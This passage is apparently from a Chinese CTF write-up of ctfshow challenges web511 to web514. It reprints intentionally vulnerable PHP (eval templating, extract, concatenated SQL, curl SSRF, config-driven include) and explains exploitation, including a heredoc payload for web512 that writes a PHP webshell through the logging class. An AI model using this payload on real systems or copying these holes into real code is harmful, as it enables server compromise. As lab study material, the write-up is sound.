if(preg_match(&#39;/&lt;|&gt;|\?|php|=|script|,|;|\(/i&#39;, $content))&#123;                $ret[&#39;msg&#39;]=&#39;文件上传失败&#39;;            &#125;else&#123;                file_put_contents(__DIR__.&#39;/../templates/&#39;.$name, $content);                $ret[&#39;msg&#39;]=&#39;文件上传成功&#39;;            &#125;                    &#125;else&#123;            $ret[&#39;msg&#39;]=&#39;文件上传失败&#39;;        &#125;        break;    default:        # code...        break;&#125;function waf($row)&#123;    $ret = false;    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&gt;name))&#123;        $ret=true;    &#125;    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&gt;type))&#123;        $ret=true;    &#125;    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&gt;des))&#123;        $ret=true;    &#125;    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&gt;path))&#123;        $ret=true;    &#125;    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&gt;id))&#123;        $ret=true;    &#125;    return $ret;&#125;die(json_encode($ret));</code></pre><p>api&#x2F;admin_edit.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-15 04:27:41 Last Modified by:   h1xa Last Modified time: 2021-03-15 07:45:25 email: h1xa@ctfer.com link: https://ctfer.com*/session_start();include(&#39;../render/db_class.php&#39;);error_reporting(0);$user= $_SESSION[&#39;user&#39;];$ret = array(        &quot;code&quot;=&gt;0,        &quot;msg&quot;=&gt;&quot;查询失败&quot;,        &quot;count&quot;=&gt;0,        &quot;data&quot;=&gt;array()    );if($user)&#123;    extract($_POST);    if(preg_match(&#39;/\&#39;|\&quot;|\\\/&#39;, $avatar))&#123;        $ret[&#39;msg&#39;]=&#39;存在无效字符&#39;;        die(json_encode($ret));    &#125;    $sql = &quot;update user set nickname=&#39;&quot;.substr($nickname, 0,8).&quot;&#39;,avatar=&#39;&quot;.$avatar.&quot;&#39; where username=&#39;&quot;.substr($user[&#39;username&#39;],0,8).&quot;&#39;&quot;;    $db=new db();    if($db-&gt;update_one($sql))&#123;        $_SESSION[&#39;user&#39;][&#39;nickname&#39;]=$nickname;        $_SESSION[&#39;user&#39;][&#39;avatar&#39;]=$avatar;        $ret[&#39;msg&#39;]=&#39;管理员信息修改成功&#39;;    &#125;else&#123;        $ret[&#39;msg&#39;]=&#39;管理员信息修改失败&#39;;    &#125;    die(json_encode($ret));&#125;else&#123;    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;    die(json_encode($ret));&#125;</code></pre><p>api&#x2F;admin_file_view.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-24 00:53:45 Last Modified by:   h1xa Last Modified time: 2021-03-25 15:46:06 email: h1xa@ctfer.com link: https://ctfer.com*/session_start();error_reporting(0);$user= $_SESSION[&#39;user&#39;];$ret = array(        &quot;code&quot;=&gt;0,        &quot;msg&quot;=&gt;&quot;查询失败&quot;,        &quot;count&quot;=&gt;0,        &quot;data&quot;=&gt;array()    );if($user)&#123;    extract($_POST);        if(preg_match(&#39;/php|sml|phar|\:|data|file|sess/i&#39;, $f))&#123;                $ret[&#39;msg&#39;]=&#39;请不要使用此功能&#39;;                die(json_encode($ret));        &#125;        if($debug==1 &amp;&amp; preg_match(&#39;/^user/&#39;, file_get_contents($f)))&#123;                include($f);        &#125;else&#123;                $ret[&#39;data&#39;]=array(&#39;contents&#39;=&gt;file_get_contents(__DIR__.&#39;/../&#39;.$name));        &#125;        $ret[&#39;msg&#39;]=&#39;查看成功&#39;;        die(json_encode($ret));&#125;else&#123;    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;    die(json_encode($ret));&#125;</code></pre><p>render&#x2F;render_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 17:52:18 Last Modified by:   h1xa Last Modified time: 2021-03-25 17:19:10 email: h1xa@ctfer.com link: https://ctfer.com*/include(&#39;file_class.php&#39;);include(&#39;cache_class.php&#39;);class templateUtil &#123;    public static function render($template,$arg=array())&#123;        $templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.sml&#39;);        $cache=templateUtil::shade($templateContent,$arg);        echo $cache;    &#125;    public static  function shade($templateContent,$arg=array())&#123;        $templateContent=templateUtil::checkImage($templateContent,$arg);        $templateContent=templateUtil::checkConfig($templateContent);        $templateContent=templateUtil::checkVar($templateContent,$arg);        foreach ($arg as $key =&gt; $value) &#123;            $templateContent=str_replace(&#39;&#123;&#123;'.$key.'&#125;&#125;&#39;, $value, $templateContent);        &#125;        return $templateContent;    &#125;    public static function checkImage($templateContent,$arg=array())&#123;        foreach ($arg as $key =&gt; $value) &#123;            if(preg_match(&#39;/gopher|file/i&#39;, $value))&#123;                $templateContent=str_replace(&#39;&#123;&#123;img:'.$key.'&#125;&#125;&#39;, &#39;&#39;, $templateContent);            &#125;            if(stripos($templateContent, &#39;&#123;&#123;img:'.$key.'&#125;&#125;&#39;))&#123;                $encode=&#39;&#39;;                if(file_exists(__DIR__.&#39;/../cache/&#39;.md5($value)))&#123;                    $encode=file_get_contents(__DIR__.&#39;/../cache/&#39;.md5($value));                &#125;else&#123;                    $ch=curl_init($value);                    curl_setopt($ch, CURLOPT_HEADER, 0);                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);                    $result=curl_exec($ch);                    curl_close($ch);                    $ret=chunk_split(base64_encode($result));                    $encode = &#39;data:image/jpg/png/gif;base64,&#39; . $ret;                    file_put_contents(__DIR__.&#39;/../cache/&#39;.md5($value), $encode);                &#125;                $templateContent=str_replace(&#39;&#123;&#123;img:'.$key.'&#125;&#125;&#39;, $encode, $templateContent);            &#125;                    &#125;        return $templateContent;    &#125;    public static function checkConfig($templateContent)&#123;        $config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings&#39;));        foreach ($config as $key =&gt; $value) &#123;            if(stripos($templateContent, &#39;&#123;&#123;config:'.$key.'&#125;&#125;&#39;))&#123;                $templateContent=str_replace(&#39;&#123;&#123;config:'.$key.'&#125;&#125;&#39;, $value, $templateContent);            &#125;                    &#125;        return $templateContent;    &#125;    public static function checkVar($templateContent,$arg)&#123;        foreach ($arg as $key =&gt; $value) &#123;            if(stripos($templateContent, &#39;&#123;&#123;var:'.$key.'&#125;&#125;&#39;))&#123;                eval(&#39;$v=&#39;.$value.&#39;;&#39;);                $templateContent=str_replace(&#39;&#123;&#123;var:'.$key.'&#125;&#125;&#39;, $v, $templateContent);            &#125;        &#125;        return $templateContent;    &#125;&#125;</code></pre><p>这次得分析别的文件了在render&#x2F;render_class.php下面找到一个eval(),我们看看参数可不可控</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414135942222.png" alt="image-20220414135942222"></p><p>shade调用了checkvar()</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414140114969.png" alt="image-20220414140114969"></p><p>render调用了shade(),先读取了这个模板文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414140311853.png" alt="image-20220414140311853"></p><p>这个render总共有六处调用其中有两处传了arg参数,这里当然只有传参的才能利用,其他的就不看了</p><p>要想利用,只能去更改$user这个数组里面的值,那么我们去搜索哪里可以更改$_SESSION[‘user’]的值</p><p>发现在admin_deit.php存在</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414141131861.png" alt="image-20220414141131861"></p><p>这里的avatar仅仅过滤了几个字符简单可以绕过</p><p>先改一下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414141636372.png" alt="image-20220414141636372"></p><p>接着index访问这个</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414141707910.png" alt="image-20220414141707910"></p><p>接着读取文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414141804254.png" alt="image-20220414141804254"></p><p>到这里我们还需要一个可以存在这里的<code>&#123;&#123;var:'.$key.'&#125;&#125;</code>也就是<code>&#123;&#123;var:'.$key.'&#125;&#125;</code>,我们之间上传一个就好了啊<code>&#123;&#123;var:nickname&#125;&#125;</code></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414141747100.png" alt="image-20220414141747100"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414145931393.png" alt="image-20220414145931393"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414150059799.png" alt="image-20220414150059799"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414145937985.png" alt="image-20220414145937985"></p><p>这里要注意stripos()函数,如果在第一位的话就执行不了了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414145955200.png" alt="image-20220414145955200"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414190915815.png"></p><h1 id="web512"><a href="#web512" class="headerlink" title="web512"></a>web512</h1><p>render&#x2F;render_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 17:52:18 Last Modified by:   h1xa Last Modified time: 2021-03-25 21:15:03 email: h1xa@ctfer.com link: https://ctfer.com*/include(&#39;file_class.php&#39;);include(&#39;cache_class.php&#39;);class templateUtil &#123;    public static function render($template,$arg=array())&#123;        $templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.sml&#39;);        $cache=templateUtil::shade($templateContent,$arg);        echo $cache;    &#125;    public static  function shade($templateContent,$arg=array())&#123;        $templateContent=templateUtil::checkImage($templateContent,$arg);        $templateContent=templateUtil::checkConfig($templateContent);        $templateContent=templateUtil::checkVar($templateContent,$arg);        foreach ($arg as $key =&gt; $value) &#123;            $templateContent=str_replace(&#39;&#123;&#123;'.$key.'&#125;&#125;&#39;, $value, $templateContent);        &#125;        return $templateContent;    &#125;    public static function checkImage($templateContent,$arg=array())&#123;        foreach ($arg as $key =&gt; $value) &#123;            if(preg_match(&#39;/gopher|file/i&#39;, $value))&#123;                $templateContent=str_replace(&#39;&#123;&#123;img:'.$key.'&#125;&#125;&#39;, &#39;&#39;, $templateContent);            &#125;            if(stripos($templateContent, &#39;&#123;&#123;img:'.$key.'&#125;&#125;&#39;))&#123;                $encode=&#39;&#39;;                if(file_exists(__DIR__.&#39;/../cache/&#39;.md5($value)))&#123;                    $encode=file_get_contents(__DIR__.&#39;/../cache/&#39;.md5($value));                &#125;else&#123;                    $ch=curl_init($value);                    curl_setopt($ch, CURLOPT_HEADER, 0);                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);                    $result=curl_exec($ch);                    curl_close($ch);                    $ret=chunk_split(base64_encode($result));                    $encode = &#39;data:image/jpg/png/gif;base64,&#39; . $ret;                    file_put_contents(__DIR__.&#39;/../cache/&#39;.md5($value), $encode);                &#125;                $templateContent=str_replace(&#39;&#123;&#123;img:'.$key.'&#125;&#125;&#39;, $encode, $templateContent);            &#125;                    &#125;        return $templateContent;    &#125;    public static function checkConfig($templateContent)&#123;        $config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings&#39;));        foreach ($config as $key =&gt; $value) &#123;            if(stripos($templateContent, &#39;&#123;&#123;config:'.$key.'&#125;&#125;&#39;))&#123;                $templateContent=str_replace(&#39;&#123;&#123;config:'.$key.'&#125;&#125;&#39;, $value, $templateContent);            &#125;                    &#125;        return $templateContent;    &#125;    public static function checkVar($templateContent,$arg)&#123;        $db=new db();        foreach ($arg as $key =&gt; $value) &#123;            if(stripos($templateContent, &#39;&#123;&#123;var:'.$key.'&#125;&#125;&#39;))&#123;                if(!preg_match(&#39;/\(|\[|\`|\&#39;|\&quot;|\+|nginx|\)|\]|include|data|text|filter|input|file|require|GET|POST|COOKIE|SESSION|file/i&#39;, $value))&#123;                    eval(&#39;$v=&#39;.$value.&#39;;&#39;);                    $templateContent=str_replace(&#39;&#123;&#123;var:'.$key.'&#125;&#125;&#39;, $v, $templateContent);                &#125;                            &#125;        &#125;        return $templateContent;    &#125;&#125;</code></pre><p>这里要进行拼接</p><p>db_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 20:43:40 Last Modified by:   h1xa Last Modified time: 2021-03-15 05:02:27 email: h1xa@ctfer.com link: https://ctfer.com*/error_reporting(0);class db&#123;    public $db;    public $log;    public $sql;    public $username=&#39;root&#39;;    public $password=&#39;root&#39;;    public $port=&#39;3306&#39;;    public $addr=&#39;127.0.0.1&#39;;    public $database=&#39;ctfshow&#39;;    public function __construct()&#123;        $this-&gt;log=new dbLog();        $this-&gt;db=$this-&gt;getConnection();    &#125;    public function getConnection()&#123;        return new mysqli($this-&gt;addr,$this-&gt;username,$this-&gt;password,$this-&gt;database);    &#125;    public  function select_one($sql)&#123;        $this-&gt;sql=$sql;        $result=$this-&gt;db-&gt;query($sql);        if($result)&#123;            return $result-&gt;fetch_object();        &#125;    &#125;    public  function select_one_array($sql)&#123;        $this-&gt;sql=$sql;        $conn = db::getConnection();        $result=$this-&gt;db-&gt;query($sql);        if($result)&#123;            return $result-&gt;fetch_assoc();        &#125;    &#125;    public function update_one($sql)&#123;        $this-&gt;sql=$sql;        $conn = db::getConnection();        $this-&gt;db-&gt;query($sql);        return $this-&gt;db-&gt;affected_rows;    &#125;    public function __destruct()&#123;        $this-&gt;log-&gt;log($this-&gt;sql);    &#125;&#125;class dbLog&#123;    public $sql;    public $content;    public $log;    public function __construct()&#123;        $this-&gt;log=&#39;log/&#39;.date_format(date_create(),&quot;Y-m-d&quot;).&#39;.txt&#39;;    &#125;    public function log($sql)&#123;        $this-&gt;content = $this-&gt;content.date_format(date_create(),&quot;Y-m-d-H-i-s&quot;).&#39; &#39;.$sql.&#39; \r\n&#39;;    &#125;    public function __destruct()&#123;        file_put_contents($this-&gt;log, $this-&gt;content,FILE_APPEND);    &#125;&#125;</code></pre><p>因为过滤掉了()所以采用include</p><pre><code class="php">1;#为了结束上一个$v的赋值语句$a = &lt;&lt;&lt;ctfshow&lt;?php includctfshow;$b = &lt;&lt;&lt;ctfshowe $ctfshow;$v1 = &lt;&lt;&lt;ctfshow_POSctfshow;$c = &lt;&lt;&lt; ctfshowT&#123;1&#125;?&gt;ctfshow;$d = &lt;&lt;&lt;ctfshow1.phpctfshow;$e = clone $db;#克隆一个$db对象,原因是$db有写文件的方法$db-&gt;log-&gt;log = $d;#前一个log是db类的log后面的是dblog类的log$db-&gt;log-&gt;content = $a.$b.$v1.$c;#$a.$b.$v1$c=&lt;?php include $_POST&#123;1&#125;?&gt;</code></pre><pre><code class="php">1;$a=&lt;&lt;&lt;ctfshow&lt;?php includctfshow;$b=&lt;&lt;&lt;ctfshowe $ctfshow;$v1=&lt;&lt;&lt;ctfshow_POSctfshow;$c=&lt;&lt;&lt;ctfshowT&#123;1&#125;?&gt;ctfshow;$d=&lt;&lt;&lt;ctfshow2.phpctfshow;$e=clone $db;$db-&gt;log-&gt;log=$d;$db-&gt;log-&gt;content=$a.$b.$v1.$c;</code></pre><pre><code class="php">&#123;&#123;var:nickname&#125;&#125;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414163202241.png" alt="image-20220414163202241"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414155052515.png" alt="image-20220414155052515"></p><p>记得抓包改</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414155109466.png" alt="image-20220414155109466"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414163241108.png" alt="image-20220414163241108"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414163406655.png" alt="image-20220414163406655"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414163441821.png" alt="image-20220414163441821"></p><h1 id="web513"><a href="#web513" class="headerlink" title="web513"></a>web513</h1><p>render&#x2F;render_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 17:52:18 Last Modified by:   h1xa Last Modified time: 2021-03-26 07:25:25 email: h1xa@ctfer.com link: https://ctfer.com*/include(&#39;file_class.php&#39;);include(&#39;cache_class.php&#39;);class templateUtil &#123;    public static function render($template,$arg=array())&#123;        $templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.sml&#39;);        $cache=templateUtil::shade($templateContent,$arg);        echo $cache;    &#125;    public static  function shade($templateContent,$arg=array())&#123;        $templateContent=templateUtil::checkImage($templateContent,$arg);        $templateContent=templateUtil::checkConfig($templateContent);        $templateContent=templateUtil::checkVar($templateContent,$arg);        $templateContent=templateUtil::checkFoot($templateContent);        foreach ($arg as $key =&gt; $value) &#123;            $templateContent=str_replace(&#39;&#123;&#123;'.$key.'&#125;&#125;&#39;, $value, $templateContent);        &#125;        return $templateContent;    &#125;    public static function checkImage($templateContent,$arg=array())&#123;        foreach ($arg as $key =&gt; $value) &#123;            if(preg_match(&#39;/gopher|file/i&#39;, $value))&#123;                $templateContent=str_replace(&#39;&#123;&#123;img:'.$key.'&#125;&#125;&#39;, &#39;&#39;, $templateContent);            &#125;            if(stripos($templateContent, &#39;&#123;&#123;img:'.$key.'&#125;&#125;&#39;))&#123;                $encode=&#39;&#39;;                if(file_exists(__DIR__.&#39;/../cache/&#39;.md5($value)))&#123;                    $encode=file_get_contents(__DIR__.&#39;/../cache/&#39;.md5($value));                &#125;else&#123;                    $ch=curl_init($value);                    curl_setopt($ch, CURLOPT_HEADER, 0);                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);                    $result=curl_exec($ch);                    curl_close($ch);                    $ret=chunk_split(base64_encode($result));                    $encode = &#39;data:image/jpg/png/gif;base64,&#39; . $ret;                    file_put_contents(__DIR__.&#39;/../cache/&#39;.md5($value), $encode);                &#125;                $templateContent=str_replace(&#39;&#123;&#123;img:'.$key.'&#125;&#125;&#39;, $encode, $templateContent);            &#125;                    &#125;        return $templateContent;    &#125;    public static function checkConfig($templateContent)&#123;        $config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings&#39;));        foreach ($config as $key =&gt; $value) &#123;            if(stripos($templateContent, &#39;&#123;&#123;config:'.$key.'&#125;&#125;&#39;))&#123;                $templateContent=str_replace(&#39;&#123;&#123;config:'.$key.'&#125;&#125;&#39;, $value, $templateContent);            &#125;                    &#125;        return $templateContent;    &#125;    public static function checkVar($templateContent,$arg)&#123;        $db=new db();        foreach ($arg as $key =&gt; $value) &#123;            if(stripos($templateContent, &#39;&#123;&#123;var:'.$key.'&#125;&#125;&#39;))&#123;                if(!preg_match(&#39;/\(|\[|\`|\&#39;|\$|\_|\&lt;|\?|\&quot;|\+|nginx|\)|\]|include|data|text|filter|input|file|GET|POST|COOKIE|SESSION|file/i&#39;, $value))&#123;                    eval(&#39;$v=&#39;.$value.&#39;;&#39;);                    $templateContent=str_replace(&#39;&#123;&#123;var:'.$key.'&#125;&#125;&#39;, $v, $templateContent);                &#125;                            &#125;        &#125;        return $templateContent;    &#125;    public static function checkFoot($templateContent)&#123;        if ( stripos($templateContent, &#39;&#123;&#123;cnzz&#125;&#125;&#39;)) &#123;            $config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings&#39;));            $foot = $config[&#39;cnzz&#39;];            if(is_file($foot))&#123;                $foot=file_get_contents($foot);                include($foot);            &#125;                    &#125;        return $templateContent;    &#125;&#125;</code></pre><p>&#x2F;api&#x2F;admin_settings.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-16 15:50:14 Last Modified by:   h1xa Last Modified time: 2021-03-16 16:26:31 email: h1xa@ctfer.com link: https://ctfer.com*/session_start();error_reporting(0);$user= $_SESSION[&#39;user&#39;];$ret = array(        &quot;code&quot;=&gt;0,        &quot;msg&quot;=&gt;&quot;查询失败&quot;,        &quot;count&quot;=&gt;0,        &quot;data&quot;=&gt;array()    );if($user)&#123;    $config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings&#39;));    foreach ($_POST as $key =&gt; $value) &#123;        $config[$key]=$value;    &#125;    file_put_contents(__DIR__.&#39;/../config/settings&#39;, serialize($config));    $ret[&#39;msg&#39;]=&#39;管理员信息修改成功&#39;;    die(json_encode($ret));&#125;else&#123;    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;    die(json_encode($ret));&#125;</code></pre><pre><code class="php">public static function checkFoot($templateContent)&#123;        if ( stripos($templateContent, &#39;&#123;&#123;cnzz&#125;&#125;&#39;)) &#123;            $config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings&#39;));            $foot = $config[&#39;cnzz&#39;];            if(is_file($foot))&#123;                $foot=file_get_contents($foot);                include($foot);            &#125;</code></pre><p>我们可以将config中的cnzz改成另一个文件,这样就可以使foot先访问config中的cnzz,接着cnzz又是另一个文件.进行二次文件访问.</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414175947530.png" alt="image-20220414174933530"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414180031940.png" alt="image-20220414180031940"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414180041275.png" alt="image-20220414180041275"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414180054215.png" alt="image-20220414180054215"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414180124402.png" alt="image-20220414180124402"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414181027066.png" alt="image-20220414181027066"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414181233123.png" alt="image-20220414181233123"></p><h1 id="web514"><a href="#web514" class="headerlink" title="web514"></a>web514</h1><p>render&#x2F;render_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 17:52:18 Last Modified by:   h1xa Last Modified time: 2021-03-28 16:27:27 email: h1xa@ctfer.com link: https://ctfer.com*/include(&#39;file_class.php&#39;);include(&#39;cache_class.php&#39;);class templateUtil &#123;    public static function render($template,$arg=array())&#123;        $templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.sml&#39;);        $cache=templateUtil::shade($templateContent,$arg);        echo $cache;    &#125;    public static  function shade($templateContent,$arg=array())&#123;        $templateContent=templateUtil::checkImage($templateContent,$arg);        $templateContent=templateUtil::checkConfig($templateContent);        $templateContent=templateUtil::checkVar($templateContent,$arg);        $templateContent=templateUtil::checkFoot($templateContent);        foreach ($arg as $key =&gt; $value) &#123;            $templateContent=str_replace(&#39;&#123;&#123;'.$key.'&#125;&#125;&#39;, $value, $templateContent);        &#125;        return $templateContent;    &#125;    public static function checkImage($templateContent,$arg=array())&#123;        foreach ($arg as $key =&gt; $value) &#123;            if(preg_match(&#39;/gopher|file/i&#39;, $value))&#123;                $templateContent=str_replace(&#39;&#123;&#123;img:'.$key.'&#125;&#125;&#39;, &#39;&#39;, $templateContent);            &#125;            if(stripos($templateContent, &#39;&#123;&#123;img:'.$key.'&#125;&#125;&#39;))&#123;                $encode=&#39;&#39;;                if(file_exists(__DIR__.&#39;/../cache/&#39;.md5($value)))&#123;                    $encode=file_get_contents(__DIR__.&#39;/../cache/&#39;.md5($value));                &#125;else&#123;                    $ch=curl_init($value);                    curl_setopt($ch, CURLOPT_HEADER, 0);                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);                    $result=curl_exec($ch);                    curl_close($ch);                    $ret=chunk_split(base64_encode($result));                    $encode = &#39;data:image/jpg/png/gif;base64,&#39; . $ret;                    file_put_contents(__DIR__.&#39;/../cache/&#39;.md5($value), $encode);                &#125;                $templateContent=str_replace(&#39;&#123;&#123;img:'.$key.'&#125;&#125;&#39;, $encode, $templateContent);            &#125;                    &#125;        return $templateContent;    &#125;    public static function checkConfig($templateContent)&#123;        $config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings&#39;));        foreach ($config as $key =&gt; $value) &#123;            if(stripos($templateContent, &#39;&#123;&#123;config:'.$key.'&#125;&#125;&#39;))&#123;                $templateContent=str_replace(&#39;&#123;&#123;config:'.$key.'&#125;&#125;&#39;, $value, $templateContent);            &#125;                    &#125;        return $templateContent;    &#125;    public static function checkVar($templateContent,$arg)&#123;        $db=new db();        foreach ($arg as $key =&gt; $value) &#123;            if(stripos($templateContent, &#39;&#123;&#123;var:'.$key.'&#125;&#125;&#39;))&#123;                if(!preg_match(&#39;/\(|\[|\`|\&#39;|\$|\_|\&lt;|\?|\&quot;|\+|nginx|\)|\]|include|data|text|filter|input|file|GET|POST|COOKIE|SESSION|file/i&#39;, $value))&#123;                    eval(&#39;$v=&#39;.$value.&#39;;&#39;);                    $templateContent=str_replace(&#39;&#123;&#123;var:'.$key.'&#125;&#125;&#39;, $v, $templateContent);                &#125;                            &#125;        &#125;        return $templateContent;    &#125;    public static function checkFoot($templateContent)&#123;        if ( stripos($templateContent, &#39;&#123;&#123;cnzz&#125;&#125;&#39;)) &#123;            $config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings&#39;));            $foot = $config[&#39;cnzz&#39;];            if(is_file($foot))&#123;                $foot=file_get_contents($foot);                if(!preg_match(&#39;/&lt;|&gt;|\?|=|php|sess|log|phar|\.|\[|\&#123;|\(|_/&#39;, $foot))&#123;                    include($foot);                &#125;                            &#125;                    &#125;        return $templateContent;    &#125;&#125;</code></pre><p>&#x2F;api&#x2F;admin_settings.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-16 15:50:14 Last Modified by:   h1xa Last Modified time: 2021-03-16 16:26:31 email: h1xa@ctfer.com link: https://ctfer.com*/session_start();error_reporting(0);$user= $_SESSION[&#39;user&#39;];$ret = array(        &quot;code&quot;=&gt;0,        &quot;msg&quot;=&gt;&quot;查询失败&quot;,        &quot;count&quot;=&gt;0,        &quot;data&quot;=&gt;array()    );if($user)&#123;    $config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings&#39;));    foreach ($_POST as $key =&gt; $value) &#123;        $config[$key]=$value;    &#125;    file_put_contents(__DIR__.&#39;/../config/settings&#39;, serialize($config));    $ret[&#39;msg&#39;]=&#39;管理员信息修改成功&#39;;    die(json_encode($ret));&#125;else&#123;    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;    die(json_encode($ret));&#125;</code></pre><p>&#x2F;api&#x2F;admin_templates.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-19 18:49:54 Last Modified by:   h1xa Last Modified time: 2021-03-25 17:17:07 email: h1xa@ctfer.com link: https://ctfer.com*/session_start();include(&#39;../render/db_class.php&#39;);error_reporting(0);$user= $_SESSION[&#39;user&#39;];$ret = array(        &quot;code&quot;=&gt;0,        &quot;msg&quot;=&gt;&quot;查询失败&quot;,        &quot;count&quot;=&gt;0,        &quot;data&quot;=&gt;array()    );$action=$_GET[&#39;action&#39;];if(!isset($user))&#123;    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;    die(json_encode($ret));&#125;switch ($action) &#123;    case &#39;list&#39;:        $sql = &quot;select id,name,type,path,des from templates limit 0,10&quot;;        $db=new db();        $temps = $db-&gt;select_array($sql);        if(count($temps)&gt;0)&#123;            $ret[&#39;count&#39;]=count($temps);            $ret[&#39;data&#39;]=$temps;            $ret[&#39;msg&#39;]=&#39;查询成功&#39;;        &#125;        break;    case &#39;update&#39;:        extract($_POST);        $row=json_decode($row);        if(waf($row))&#123;            break;        &#125;        $sql =&quot;update templates set name=&#39;&#123;$row-&gt;name&#125;&#39;,path=&#39;&#123;$row-&gt;path&#125;&#39;,type=&#39;&#123;$row-&gt;type&#125;&#39;,des=&#39;&#123;$row-&gt;des&#125;&#39; where id =&#123;$row-&gt;id&#125;&quot;;        $db = new db();        if($db-&gt;update_one($sql))&#123;            $ret[&#39;msg&#39;]=&#39;实时更新成功&#39;;        &#125;else&#123;            $ret[&#39;msg&#39;]=&#39;实时更新失败&#39;;        &#125;        break;    case &#39;getContents&#39;:        extract($_POST);        $template=json_decode($template);        if(preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\/\\u4e00-\u9fa5]+$/&#39;, $template-&gt;path))&#123;            $ret[&#39;count&#39;]=1;            $ret[&#39;msg&#39;]=&#39;查询成功&#39;;            $ret[&#39;data&#39;]=array(&#39;contents&#39;=&gt;htmlspecialchars(file_get_contents(__DIR__.&#39;/../templates/&#39;.$template-&gt;path)));        &#125;        break;    case &#39;download&#39;:        extract($_POST);        if(preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\/\u4e00-\u9fa5]+$/&#39;, $path))&#123;            header(&quot;Content-Type: application/octet-stream&quot;);             header(&#39;Content-Disposition:  attachment; filename=&quot;&#39; . $path. &#39;&quot;&#39;);            echo file_get_contents(__DIR__.&#39;/../templates/&#39;.$path);            exit();        &#125;        break;    case &#39;upload&#39;:        extract($_POST);        if(!preg_match(&#39;/php|phar|ini|settings/i&#39;, $name))        &#123;                if(preg_match(&#39;/&lt;|&gt;|\?|php|=|script|,|;|\(/i&#39;, $content))&#123;                $ret[&#39;msg&#39;]=&#39;文件上传失败&#39;;            &#125;else&#123;                